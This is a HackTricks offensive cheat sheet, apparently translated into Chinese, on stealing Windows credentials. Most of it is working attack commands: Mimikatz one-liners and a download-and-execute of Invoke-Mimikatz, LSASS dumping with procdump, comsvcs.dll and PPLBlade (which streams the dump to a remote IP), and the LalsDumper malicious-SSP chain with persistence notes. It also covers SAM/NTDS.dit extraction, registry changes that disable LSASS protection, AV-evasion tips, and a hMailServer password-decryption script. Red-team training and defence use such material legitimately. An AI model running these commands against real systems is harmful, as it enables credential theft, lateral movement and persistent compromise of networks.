# 窃取 Windows 凭证

{{#include ../../banners/hacktricks-training.md}}

## 凭证 Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**查找 Mimikatz 可以执行的其他操作，见** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **这些防护可能会阻止 Mimikatz 提取某些 credentials。**

## 使用 Meterpreter 的 Credentials

使用 **我创建的** [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) 来在受害者主机中 **搜索 passwords 和 hashes**。
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## 绕过 AV

### Procdump + Mimikatz

由于 **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is a legitimate Microsoft tool**，它不会被 Defender 检测到。\
你可以使用这个工具来 **dump the lsass process**、**download the dump** 并从 dump 中 **extract** **credentials locally**。

你也可以使用 [SharpDump](https://github.com/GhostPack/SharpDump)。
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
这个过程可以使用 [SprayKatz](https://github.com/aas-n/spraykatz) 自动完成： `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注意**：一些 **AV** 可能会把使用 **procdump.exe to dump lsass.exe** 视为 **恶意**，这是因为它们检测到字符串 **"procdump.exe" and "lsass.exe"**。因此，将 lsass.exe 的 **PID** 作为 **argument** 传给 procdump，而不是使用名称 **lsass.exe**，会更 **隐蔽**。

### 使用 **comsvcs.dll** 转储 lsass

位于 `C:\Windows\System32` 的一个名为 **comsvcs.dll** 的 DLL 负责在崩溃时 **转储进程内存**。该 DLL 包含一个名为 **`MiniDumpW`** 的 **函数**，用于通过 `rundll32.exe` 调用。  
前两个参数无关紧要，但第三个参数由三部分组成。第一部分是要转储的进程 ID，第二部分是转储文件的位置，第三部分严格要求是单词 **full**，没有其他选项。  
在解析这三部分后，DLL 会创建转储文件并将指定进程的内存写入该文件。  
可以利用 **comsvcs.dll** 转储 lsass 进程，从而无需上传并执行 procdump。该方法的详细说明见 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords)。

执行的命令如下：
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**您可以使用** [**lssasy**](https://github.com/Hackndo/lsassy)** 自动化此过程。**

### **使用 Task Manager 转储 lsass**

1. 在 Task Bar 上右键单击，然后点击 Task Manager  
2. 点击 More details  
3. 在 Processes tab 中查找 "Local Security Authority Process" 进程  
4. 在 "Local Security Authority Process" 进程上右键单击，然后点击 "Create dump file"。

### 使用 procdump 转储 lsass

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 是一个由 Microsoft 签名的二进制程序，属于 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 套件。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## 使用 PPLBlade 转储 lsass

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) 是一个 Protected Process Dumper Tool，支持对 memory dump 进行混淆并在远程工作站传输，且不将其写入磁盘。

**Key functionalities**:

1. 绕过 PPL 保护
2. 对 memory dump 文件进行混淆以规避 Defender 的基于签名的检测机制
3. 使用 RAW 和 SMB 上传方法上传 memory dump，而不将其写入磁盘（fileless dump）
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon 提供了一个三阶段的 dumper，名为 **LalsDumper**，它从不调用 `MiniDumpWriteDump`，因此针对该 API 的 EDR 钩子不会触发：

1. **Stage 1 loader (`lals.exe`)** – 在 `fdp.dll` 中搜索由 32 个小写 `d` 字符构成的占位符，将其覆盖为 `rtu.txt` 的绝对路径，将修补后的 DLL 保存为 `nfdp.dll`，然后调用 `AddSecurityPackageA("nfdp","fdp")`。这会强制 **LSASS** 将该恶意 DLL 作为新的 Security Support Provider (SSP) 加载。
2. **Stage 2 inside LSASS** – 当 LSASS 加载 `nfdp.dll` 时，该 DLL 读取 `rtu.txt`，将每个字节与 `0x20` 做 XOR，然后将解码后的 blob 映射到内存并转移执行。
3. **Stage 3 dumper** – 映射的 payload 重新实现了 MiniDump 逻辑，使用从哈希 API 名称解析的 **direct syscalls**（`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`）。一个名为 `Tom` 的专用导出打开 `%TEMP%\<pid>.ddt`，将压缩的 LSASS 转储流式写入该文件，然后关闭句柄，以便稍后进行 exfiltration。

Operator notes:

* 将 `lals.exe`, `fdp.dll`, `nfdp.dll`, 和 `rtu.txt` 保持在同一目录。Stage 1 会用 `rtu.txt` 的绝对路径重写硬编码的占位符，因此将它们拆开会破坏执行链。
* Registration happens by appending `nfdp` to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. You can seed that value yourself to make LSASS reload the SSP every boot.
* `%TEMP%\*.ddt` files are compressed dumps. Decompress locally, then feed them to Mimikatz/Volatility for credential extraction.
* 运行 `lals.exe` 需要 admin/SeTcb 权限以使 `AddSecurityPackageA` 成功；该调用返回后，LSASS 会透明地加载该恶意 SSP 并执行 Stage 2。
* 从磁盘删除 DLL 不会将其从 LSASS 中驱逐。要么删除注册表项并重启 LSASS（重启系统），要么保留它以实现长期持久性。

## CrackMapExec
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### 转储 LSA 秘密
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 从目标 DC 转储 NTDS.dit
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 从目标 DC 转储 NTDS.dit 的密码历史
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 显示每个 NTDS.dit 帐户的 pwdLastSet 属性
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

这些文件应该**位于** _C:\windows\system32\config\SAM_ 和 _C:\windows\system32\config\SYSTEM._ 但**你不能像常规方式那样直接复制它们**，因为它们受到保护。

### 来自注册表

获取这些文件最简单的方法是从注册表复制一份：
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**下载** 那些文件到你的 Kali 机器并使用以下命令 **提取 hashes**:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### 卷影复制

您可以使用此服务复制受保护的文件。您需要具有管理员权限。

#### 使用 vssadmin

vssadmin 可执行文件仅在 Windows Server 版本中可用。
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
但是你也可以使用 **Powershell** 来做同样的操作。下面是一个 **如何复制 SAM 文件** 的示例（所使用的硬盘为 "C:"，并保存到 C:\users\Public），但你可以用它来复制任何受保护的文件：
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
书中的代码： [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

最后，你也可以使用 [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) 来复制 SAM、SYSTEM 和 ntds.dit。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory 凭证 - NTDS.dit**

The **NTDS.dit** file is known as the heart of **Active Directory**, holding crucial data about user objects, groups, and their memberships. It's where the **password hashes** for domain users are stored. This file is an **Extensible Storage Engine (ESE)** database and resides at **_%SystemRoom%/NTDS/ntds.dit_**.

Within this database, three primary tables are maintained:

- **Data Table**: 此表负责存储有关用户和组等对象的详细信息。
- **Link Table**: 用于记录关系，例如组成员关系。
- **SD Table**: **Security descriptors** 在此保存每个对象的 **Security descriptors**，以确保所存对象的安全性和访问控制。

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).

#### 解密 NTDS.dit 中的哈希

哈希被加密三次：

1. 使用 **BOOTKEY** 和 **RC4** 解密密码加密密钥 (Password Encryption Key, **PEK**)。
2. 使用 **PEK** 和 **RC4** 解密该 **哈希**。
3. 使用 **DES** 解密 **哈希**。

**PEK** 在每个 **域控制器** 中具有 **相同的值**，但它在 **NTDS.dit** 文件中是使用该域控制器的 **SYSTEM** 文件的 **BOOTKEY** 所**加密**的（不同域控制器之间的 BOOTKEY 是不同的）。这就是为什么要从 NTDS.dit 文件获取凭证时，**你需要 NTDS.dit 和 SYSTEM 文件**（_C:\Windows\System32\config\SYSTEM_）。

### 使用 Ntdsutil 复制 NTDS.dit

自 Windows Server 2008 起可用。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
你也可以使用 [**volume shadow copy**](#stealing-sam-and-system) trick 来复制 **ntds.dit** 文件。请记住，你还需要一份 **SYSTEM file**（同样，[**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick）。

### **从 NTDS.dit 提取 hashes**

一旦你 **获得** 了文件 **NTDS.dit** 和 **SYSTEM**，你可以使用像 _secretsdump.py_ 这样的工具来 **提取 hashes**：
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
你也可以使用一个有效的 domain admin user **自动提取它们**：
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
对于 **big NTDS.dit files**，建议使用 [gosecretsdump](https://github.com/c-sto/gosecretsdump) 来提取它。

此外，你也可以使用 **metasploit module**：_post/windows/gather/credentials/domain_hashdump_ 或 **mimikatz** `lsadump::lsa /inject`

### **将 NTDS.dit 中的域对象提取到 SQLite 数据库**

可以使用 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) 将 NTDS 对象提取到 SQLite 数据库。不仅会提取 secrets，而且还会提取整个对象及其属性，以便在已获取原始 NTDS.dit 文件后进行进一步的信息提取。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive 是可选的，但可用于秘密的解密（NT & LM hashes、supplemental credentials，例如 cleartext passwords、kerberos 或 trust keys、NT & LM password histories）。除了其他信息外，还会提取以下数据：带有其 hashes 的用户和机器账户、UAC flags、上次 logon 和 password change 的时间戳、账户描述、名称、UPN、SPN、组及其递归成员资格、组织单位树及成员关系、trusted domains 以及 trusts type、direction 和 attributes...

## Lazagne

从 [here](https://github.com/AlessandroZ/LaZagne/releases) 下载二进制文件。你可以使用该二进制从多个软件中提取 credentials。
```
lazagne.exe all
```
## 从 SAM 和 LSASS 提取凭证的其他工具

### Windows credentials Editor (WCE)

该工具可用于从内存中提取凭证。下载地址: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

从 SAM 文件提取凭证
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

从 SAM 文件中提取凭据
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **执行它**，密码就会被提取。

## 挖掘空闲的 RDP 会话并削弱安全控制

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### DumpRDPHistory 风格的遥测收集

* **Outbound RDP targets** – 解析每个用户 hive（位于 `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`）。每个子项存储服务器名、`UsernameHint` 和最后写入时间。你可以用 PowerShell 复现 FinalDraft 的逻辑：

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – 查询 `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` 日志中 Event IDs **21**（成功登录）和 **25**（断开），以映射谁管理了该主机：

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

一旦你知道哪个 Domain Admin 经常连接，就在他们的 **断开** 会话仍存在时转储 LSASS（使用 LalsDumper/Mimikatz）。CredSSP + NTLM 回退会将其 verifier 和令牌保留在 LSASS 中，然后可以通过 SMB/WinRM 重放这些数据以获取 `NTDS.dit` 或在域控制器上部署持久化。

### FinalDraft 针对的注册表降级

同一个植入程序还会篡改多个注册表键，以使 credential theft 更容易：
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* 设置 `DisableRestrictedAdmin=1` 会在 RDP 中强制完全重用凭证/票据，从而启用 pass-the-hash 风格的横向移动。
* `LocalAccountTokenFilterPolicy=1` 禁用 UAC 令牌过滤，使本地管理员在网络上获取不受限制的令牌。
* `DSRMAdminLogonBehavior=2` 允许 DSRM 管理员在 DC 在线时登录，为攻击者提供另一个内置的高权限帐户。
* `RunAsPPL=0` 会移除 LSASS PPL 保护，使得像 LalsDumper 之类的转储工具轻易访问内存。

## hMailServer 数据库凭据（妥协后）

hMailServer 将其 DB 密码存储在 `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` 的 `[Database] Password=` 下。该值使用静态密钥 `THIS_KEY_IS_NOT_SECRET` 通过 Blowfish 加密，并进行了 4 字节字序交换。使用 INI 中的十六进制字符串配合下面的 Python 片段：
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
使用 clear-text password 复制 SQL CE database 以避免文件锁定，加载 32-bit provider，并在查询 hashes 之前如有需要进行 upgrade：
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` 列使用 hMailServer 哈希格式（hashcat 模式 `1421`）。破解这些值可以提供可重用的 credentials，用于 WinRM/SSH pivots。
## References

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
